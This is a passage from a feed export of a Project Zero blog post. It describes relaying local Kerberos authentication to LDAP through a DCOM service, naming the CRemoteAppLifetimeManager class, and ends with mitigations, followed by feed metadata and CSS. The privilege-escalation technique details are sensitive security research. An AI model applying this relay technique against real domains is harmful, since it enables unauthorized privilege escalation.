Registry.CurrentUser.DeleteSubKeyTree(dummy);&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c12"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This code redirects the &lt;/span&gt;&lt;span class="c4"&gt;HKEY_LOCAL_MACHINE&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;key and then loads the LDAP library. Once it&amp;#39;s loaded we can then revert the override so that everything else works as expected. We can now repurpose the built-in LDAP library to relay Kerberos authentication to the domain controller. For the final step, we need a privileged COM service to unmarshal the OBJREF to start the process.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c23" id="h.dwt9lb67za71"&gt;&lt;span class="c25 c17"&gt;Choosing a COM Unmarshaller &lt;/span&gt;&lt;/h2&gt; &lt;p class="c5"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c4"&gt;RemotePotato &lt;/span&gt;&lt;span&gt;attack assumes that a more privileged user is authenticated on the same machine. However I wanted to see what I could do &lt;/span&gt;&lt;span class="c4"&gt;without&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;that requirement. Realistically the only thing that can be done is to relay the computer&amp;#39;s domain account to the LDAP server. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;To get access to authentication for the computer account, we need to unmarshal the OBJREF inside a process running as either &lt;/span&gt;&lt;span class="c4"&gt;SYSTEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c4"&gt;NETWORK SERVICE&lt;/span&gt;&lt;span class="c9"&gt;. These local accounts are mapped to the computer account when authenticating to another machine on the network. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;We do have one big limitation on the selection of a suitable COM server: it must make the RPC connection using the &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;authentication level. Anything above that will enable Integrity on the authentication which will prevent us relaying to LDAP. Fortunately &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the default setting for DCOM, but unfortunately all services which use the &lt;/span&gt;&lt;span class="c4"&gt;svchost &lt;/span&gt;&lt;span&gt;process change that default to &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which enables Integrity.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;After a bit of hunting around with &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="http://oleview.net"&gt;OleViewDotNet&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, I found a good candidate class, &lt;/span&gt;&lt;span class="c4"&gt;CRemoteAppLifetimeManager&lt;/span&gt;&lt;span&gt;&amp;nbsp;(CLSID: 0bae55fc-479f-45c2-972e-e951be72c0c1) which is hosted in its own executable, runs as &lt;/span&gt;&lt;span class="c4"&gt;NETWORK SERVICE&lt;/span&gt;&lt;span class="c9"&gt;, and doesn&amp;#39;t change any default settings as shown below.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEidURAkEasK6VlKb5Hy9h7j1_LPDlm6AS2ltlSgW2pxErQLE5HYWuEYfXDdgyXQwyRrvvdYTy6hVScwIyMXDmInxwHMsCwEehclcJCnZnJcCj4mT0rt59zaJwFW_q9h6VjMCvTZQ6hvBTA8wQovPM8nfRzYJoTk3Gtl0K5nlaMHB4l30dMe_eTJxTFpAQ=s945" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEidURAkEasK6VlKb5Hy9h7j1_LPDlm6AS2ltlSgW2pxErQLE5HYWuEYfXDdgyXQwyRrvvdYTy6hVScwIyMXDmInxwHMsCwEehclcJCnZnJcCj4mT0rt59zaJwFW_q9h6VjMCvTZQ6hvBTA8wQovPM8nfRzYJoTk3Gtl0K5nlaMHB4l30dMe_eTJxTFpAQ=s945" border="0" alt="Screenshot of the OleViewDotNet showing the security flags of the CRemoteAppLifetimeManager COM server" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;The server doesn&amp;#39;t change the default impersonation level from &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_IMP_LEVEL_IDENTIFY&lt;/span&gt;&lt;span&gt;, which means the negotiated token will only be at &lt;/span&gt;&lt;span class="c4"&gt;SecurityIdentification&lt;/span&gt;&lt;span&gt;&amp;nbsp;level. For LDAP, this doesn&amp;#39;t matter as it only uses the token for access checking, not to open resources. However, this would prevent using the same authentication to access something like the SMB server. I&amp;#39;m confident that given enough effort, a COM server with both &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_CONNECT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_IMP_LEVEL_IMPERSONATE&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;could be found, but it wasn&amp;#39;t necessary for my exploit.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c23" id="h.38szqoyv0vag"&gt;&lt;span class="c25 c17"&gt;Wrapping Up&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5"&gt;&lt;span&gt;That&amp;#39;s a somewhat complex exploit. However, it does allow for authentication relay, with arbitrary Kerberos tokens from a local user to LDAP on a default Windows 10 system. Hopefully it might provide some ideas of how to implement something similar without always needing to write your protocol servers and clients and just use what&amp;#39;s already available.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;This exploit is very similar to the existing RemotePotato exploit that Microsoft have already stated will not be fixed. This is because Microsoft considers authentication relay attacks to be an issue with the configuration of the Windows network, such as not enforcing signing on LDAP, rather than the particular technique used to generate the authentication relay. As I mentioned in the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html"&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;, at most this would be assessed as a Moderate severity issue which does not reach the bar for fixing as part of regular updates (or potentially, not being fixed at all).&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span&gt;As for mitigating this issue without it being fixed by Microsoft, a system administrator should follow Microsoft&amp;#39;s recommendations to enable signing and/or encryption on any sensitive service in the domain, especially LDAP. They can also enable Extended Protection for Authentication where the service is protected by TLS. They can also configure the &lt;/span&gt;&lt;span class="c2"&gt;&lt;a class="c211" href="https://docs.microsoft.com/en-us/windows/win32/com/setting-machine-wide-security-using-dcomcnfg#setting-system-wide-default-authentication-level"&gt;default DCOM authentication level&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_PKT_INTEGRITY&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;or above. These changes would make the relay of Kerberos, or NTLM significantly less useful.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/5634534606665421566/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5634534606665421566" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5634534606665421566" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html" title="Windows Exploitation Tricks: Relaying DCOM Authentication" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/a/AVvXsEgC1LWHaQILinmN2Ri4wwnm_orJGvy_JlW1bSGw-cA58EhUiJ1pjqPVIB631q6rAJ4CfuaxX41dSkuQVzbYfUi3kMTu6Nukm1r6Pctu50MG9D6DbXCR5p7nS3_R2-__ijBFvR4bY6KG8xfM1JRlmmsf9zSfgKjmBWh6PPW6KhGMVwToaS3KIBAQXJ9-qg=s72-c" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-6510029969921067809</id>
    <published>2021-10-20T09:26:00.000-07:00</published>
    <updated>2021-10-21T09:00:10.361-07:00</updated>
    <title type="text">Using Kerberos for Authentication Relay Attacks</title>
    <content type="html">&lt;style type="text/css"&gt;ol.lst-kix_d25vxsk234hv-6{list-style-type:none}.lst-kix_wkcrlfh2qk3l-7&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-7}.lst-kix_i2wckd3yhfhe-0&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-0}ol.lst-kix_i2wckd3yhfhe-5.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-5 0}ol.lst-kix_d25vxsk234hv-5{list-style-type:none}ol.lst-kix_d25vxsk234hv-4{list-style-type:none}ol.lst-kix_jp16emg17n48-2.start{counter-reset:lst-ctn-kix_jp16emg17n48-2 0}ol.lst-kix_d25vxsk234hv-3{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-8{list-style-type:none}ol.lst-kix_d25vxsk234hv-2{list-style-type:none}ol.lst-kix_d25vxsk234hv-3.start{counter-reset:lst-ctn-kix_d25vxsk234hv-3 0}ol.lst-kix_d25vxsk234hv-1{list-style-type:none}ol.lst-kix_d25vxsk234hv-0{list-style-type:none}.lst-kix_d25vxsk234hv-4&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-4}.lst-kix_jp16emg17n48-8&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-8}ul.lst-kix_fmj6vk2ylkib-0{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-1{list-style-type:none}ol.lst-kix_d25vxsk234hv-6.start{counter-reset:lst-ctn-kix_d25vxsk234hv-6 0}ol.lst-kix_i2wckd3yhfhe-4{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-8{list-style-type:none}.lst-kix_wkcrlfh2qk3l-8&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-8}ol.lst-kix_i2wckd3yhfhe-5{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-6{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-6{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-7{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-7{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-0{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-4{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-1{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-5{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-2{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-2{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-3{list-style-type:none}ul.lst-kix_fmj6vk2ylkib-3{list-style-type:none}.lst-kix_2yktnm17nyl7-2&gt;li:before{content:"\0025a0  "}.lst-kix_2yktnm17nyl7-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_2yktnm17nyl7-8{list-style-type:none}ul.lst-kix_2yktnm17nyl7-7{list-style-type:none}ul.lst-kix_2yktnm17nyl7-6{list-style-type:none}.lst-kix_d25vxsk234hv-2&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-2}.lst-kix_2yktnm17nyl7-1&gt;li:before{content:"\0025cb  "}.lst-kix_d25vxsk234hv-5&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-5}.lst-kix_jp16emg17n48-7&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-7}ol.lst-kix_jp16emg17n48-8.start{counter-reset:lst-ctn-kix_jp16emg17n48-8 0}ol.lst-kix_d25vxsk234hv-0.start{counter-reset:lst-ctn-kix_d25vxsk234hv-0 0}.lst-kix_2yktnm17nyl7-0&gt;li:before{content:"\0025cf  "}.lst-kix_jp16emg17n48-4&gt;li:before{content:"(" counter(lst-ctn-kix_jp16emg17n48-4,lower-latin) ") "}ol.lst-kix_wkcrlfh2qk3l-6.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-6 0}.lst-kix_jp16emg17n48-3&gt;li:before{content:"(" counter(lst-ctn-kix_jp16emg17n48-3,decimal) ") "}.lst-kix_jp16emg17n48-5&gt;li:before{content:"(" counter(lst-ctn-kix_jp16emg17n48-5,lower-roman) ") "}ul.lst-kix_2yktnm17nyl7-1{list-style-type:none}.lst-kix_jp16emg17n48-0&gt;li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-0,decimal) ") "}ul.lst-kix_2yktnm17nyl7-0{list-style-type:none}.lst-kix_jp16emg17n48-1&gt;li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-1,lower-latin) ") "}ul.lst-kix_2yktnm17nyl7-5{list-style-type:none}.lst-kix_jp16emg17n48-2&gt;li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-2,lower-roman) ") "}.lst-kix_wkcrlfh2qk3l-6&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-6}ul.lst-kix_2yktnm17nyl7-4{list-style-type:none}ol.lst-kix_i2wckd3yhfhe-0.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-0 0}ol.lst-kix_jp16emg17n48-5.start{counter-reset:lst-ctn-kix_jp16emg17n48-5 0}ul.lst-kix_2yktnm17nyl7-3{list-style-type:none}ol.lst-kix_d25vxsk234hv-8{list-style-type:none}ul.lst-kix_2yktnm17nyl7-2{list-style-type:none}ol.lst-kix_d25vxsk234hv-7{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-3.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-3 0}.lst-kix_jp16emg17n48-0&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-0}.lst-kix_jp16emg17n48-7&gt;li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-7,lower-latin) ". "}ol.lst-kix_i2wckd3yhfhe-3.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-3 0}.lst-kix_jp16emg17n48-6&gt;li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-6,decimal) ". "}ol.lst-kix_i2wckd3yhfhe-7.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-7 0}.lst-kix_jp16emg17n48-6&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-6}.lst-kix_wkcrlfh2qk3l-5&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-5}ol.lst-kix_jp16emg17n48-4.start{counter-reset:lst-ctn-kix_jp16emg17n48-4 0}.lst-kix_jp16emg17n48-8&gt;li:before{content:"" counter(lst-ctn-kix_jp16emg17n48-8,lower-roman) ". "}ol.lst-kix_jp16emg17n48-3.start{counter-reset:lst-ctn-kix_jp16emg17n48-3 0}ol.lst-kix_wkcrlfh2qk3l-4.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-4 0}.lst-kix_wkcrlfh2qk3l-2&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-2}ol.lst-kix_i2wckd3yhfhe-2.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-2 0}.lst-kix_d25vxsk234hv-0&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-0}ol.lst-kix_d25vxsk234hv-5.start{counter-reset:lst-ctn-kix_d25vxsk234hv-5 0}ol.lst-kix_jp16emg17n48-8{list-style-type:none}.lst-kix_d25vxsk234hv-6&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-6}ol.lst-kix_jp16emg17n48-7{list-style-type:none}.lst-kix_i2wckd3yhfhe-1&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-1}ol.lst-kix_i2wckd3yhfhe-8.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-8 0}.lst-kix_i2wckd3yhfhe-4&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-4}ol.lst-kix_jp16emg17n48-4{list-style-type:none}ol.lst-kix_jp16emg17n48-3{list-style-type:none}ol.lst-kix_jp16emg17n48-6{list-style-type:none}ol.lst-kix_jp16emg17n48-5{list-style-type:none}ol.lst-kix_jp16emg17n48-0{list-style-type:none}ol.lst-kix_jp16emg17n48-2{list-style-type:none}.lst-kix_d25vxsk234hv-3&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-3}.lst-kix_i2wckd3yhfhe-7&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-7}ol.lst-kix_jp16emg17n48-1{list-style-type:none}.lst-kix_fmj6vk2ylkib-1&gt;li:before{content:"\0025cb  "}.lst-kix_wkcrlfh2qk3l-1&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-1}.lst-kix_fmj6vk2ylkib-0&gt;li:before{content:"\0025cf  "}.lst-kix_fmj6vk2ylkib-2&gt;li:before{content:"\0025a0  "}.lst-kix_fmj6vk2ylkib-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_wkcrlfh2qk3l-8.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-8 0}.lst-kix_i2wckd3yhfhe-1&gt;li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-1,lower-latin) ") "}.lst-kix_jp16emg17n48-2&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-2}.lst-kix_i2wckd3yhfhe-2&gt;li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-2,lower-roman) ") "}.lst-kix_i2wckd3yhfhe-6&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-6}.lst-kix_i2wckd3yhfhe-4&gt;li:before{content:"(" counter(lst-ctn-kix_i2wckd3yhfhe-4,lower-latin) ") "}.lst-kix_wkcrlfh2qk3l-7&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-7,lower-latin) ". "}.lst-kix_wkcrlfh2qk3l-8&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-8,lower-roman) ". "}.lst-kix_i2wckd3yhfhe-3&gt;li:before{content:"(" counter(lst-ctn-kix_i2wckd3yhfhe-3,decimal) ") "}.lst-kix_i2wckd3yhfhe-5&gt;li:before{content:"(" counter(lst-ctn-kix_i2wckd3yhfhe-5,lower-roman) ") "}.lst-kix_jp16emg17n48-3&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-3}.lst-kix_i2wckd3yhfhe-5&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-5}ol.lst-kix_jp16emg17n48-6.start{counter-reset:lst-ctn-kix_jp16emg17n48-6 0}.lst-kix_i2wckd3yhfhe-8&gt;li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-8,lower-roman) ". "}.lst-kix_d25vxsk234hv-8&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-8,lower-roman) ". "}ol.lst-kix_wkcrlfh2qk3l-5.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-5 0}ol.lst-kix_i2wckd3yhfhe-1.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-1 0}.lst-kix_i2wckd3yhfhe-7&gt;li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-7,lower-latin) ". "}.lst-kix_i2wckd3yhfhe-6&gt;li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-6,decimal) ". "}.lst-kix_jp16emg17n48-1&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-1}.lst-kix_d25vxsk234hv-4&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-4,lower-latin) ". "}.lst-kix_wkcrlfh2qk3l-0&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-0,decimal) ". "}.lst-kix_d25vxsk234hv-8&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-8}.lst-kix_jp16emg17n48-4&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-4}.lst-kix_d25vxsk234hv-3&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-3,decimal) ". "}.lst-kix_d25vxsk234hv-5&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-5,lower-roman) ". "}ol.lst-kix_i2wckd3yhfhe-6.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-6 0}.lst-kix_wkcrlfh2qk3l-1&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-1,lower-latin) ". "}ol.lst-kix_wkcrlfh2qk3l-2.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-2 0}.lst-kix_d25vxsk234hv-7&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-7,lower-latin) ". "}ol.lst-kix_d25vxsk234hv-4.start{counter-reset:lst-ctn-kix_d25vxsk234hv-4 0}.lst-kix_d25vxsk234hv-6&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-6,decimal) ". "}.lst-kix_wkcrlfh2qk3l-6&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-6,decimal) ". "}.lst-kix_fmj6vk2ylkib-8&gt;li:before{content:"\0025a0  "}.lst-kix_fmj6vk2ylkib-7&gt;li:before{content:"\0025cb  "}.lst-kix_wkcrlfh2qk3l-5&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-5,lower-roman) ". "}.lst-kix_wkcrlfh2qk3l-0&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-0}.lst-kix_i2wckd3yhfhe-0&gt;li:before{content:"" counter(lst-ctn-kix_i2wckd3yhfhe-0,decimal) ") "}.lst-kix_fmj6vk2ylkib-5&gt;li:before{content:"\0025a0  "}.lst-kix_d25vxsk234hv-0&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-0,decimal) ". "}.lst-kix_wkcrlfh2qk3l-3&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-3,decimal) ". "}.lst-kix_wkcrlfh2qk3l-4&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-4,lower-latin) ". "}ol.lst-kix_d25vxsk234hv-7.start{counter-reset:lst-ctn-kix_d25vxsk234hv-7 0}.lst-kix_wkcrlfh2qk3l-3&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-3}.lst-kix_fmj6vk2ylkib-4&gt;li:before{content:"\0025cb  "}.lst-kix_fmj6vk2ylkib-6&gt;li:before{content:"\0025cf  "}.lst-kix_d25vxsk234hv-1&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-1,lower-latin) ". "}.lst-kix_d25vxsk234hv-2&gt;li:before{content:"" counter(lst-ctn-kix_d25vxsk234hv-2,lower-roman) ". "}.lst-kix_wkcrlfh2qk3l-2&gt;li:before{content:"" counter(lst-ctn-kix_wkcrlfh2qk3l-2,lower-roman) ". "}.lst-kix_wkcrlfh2qk3l-4&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-4}.lst-kix_d25vxsk234hv-1&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-1}ol.lst-kix_d25vxsk234hv-8.start{counter-reset:lst-ctn-kix_d25vxsk234hv-8 0}ol.lst-kix_d25vxsk234hv-1.start{counter-reset:lst-ctn-kix_d25vxsk234hv-1 0}.lst-kix_d25vxsk234hv-7&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-7}.lst-kix_i2wckd3yhfhe-3&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-3}.lst-kix_jp16emg17n48-5&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-5}ol.lst-kix_jp16emg17n48-7.start{counter-reset:lst-ctn-kix_jp16emg17n48-7 0}ol.lst-kix_wkcrlfh2qk3l-4{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-0.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-0 0}ol.lst-kix_wkcrlfh2qk3l-3{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-2{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-1{list-style-type:none}.lst-kix_i2wckd3yhfhe-8&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-8}ol.lst-kix_wkcrlfh2qk3l-0{list-style-type:none}ol.lst-kix_jp16emg17n48-1.start{counter-reset:lst-ctn-kix_jp16emg17n48-1 0}ol.lst-kix_i2wckd3yhfhe-4.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-4 0}ol.lst-kix_wkcrlfh2qk3l-8{list-style-type:none}.lst-kix_i2wckd3yhfhe-2&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-2}ol.lst-kix_wkcrlfh2qk3l-7{list-style-type:none}.lst-kix_2yktnm17nyl7-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_wkcrlfh2qk3l-6{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-5{list-style-type:none}ol.lst-kix_d25vxsk234hv-2.start{counter-reset:lst-ctn-kix_d25vxsk234hv-2 0}.lst-kix_2yktnm17nyl7-5&gt;li:before{content:"\0025a0  "}.lst-kix_2yktnm17nyl7-6&gt;li:before{content:"\0025cf  "}.lst-kix_2yktnm17nyl7-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_wkcrlfh2qk3l-7.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-7 0}.lst-kix_2yktnm17nyl7-8&gt;li:before{content:"\0025a0  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_wkcrlfh2qk3l-1.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-1 0}ol.lst-kix_jp16emg17n48-0.start{counter-reset:lst-ctn-kix_jp16emg17n48-0 0}ol{margin:0;padding:0}table td,table th{padding:0}.c29{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:49.5pt;border-top-color:#000000;border-bottom-style:solid}.c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:66.8pt;border-top-color:#000000;border-bottom-style:solid}.c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c22{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:87pt;border-top-color:#000000;border-bottom-style:solid}.c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:81pt;border-top-color:#000000;border-bottom-style:solid}.c15{border-right-style:solid;padding:5pt 5pt 5pt 